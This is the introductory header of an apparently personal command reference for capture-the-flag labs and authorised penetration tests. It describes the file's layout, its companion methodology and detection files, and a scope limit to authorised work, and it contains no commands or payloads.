hacktheplanet — CTF / HTB / authorized-engagement command reference
==========================================================================
Command-first field reference: copy-paste syntax, per service / per port. The
phase -> ATT&CK -> tool MAP is OFFENSIVE-METHODOLOGY.md; the working METHOD (the
recon loop, the unsticking playbook) is ~/ippsec (`ipp`); the blue-team mirror
(detections + event IDs) is PURPLE-TEAM.md.

Folds in vim/neovim (modeline at the bottom wires it): `za` toggle a fold, `zM`
close all, `zR` open all.

SCOPE: authorized engagements (written ROE + scope) or your own CTF/HTB labs ONLY.
Engagement DATA lives in ~/engagements (`mkengagement`), never in this repo.

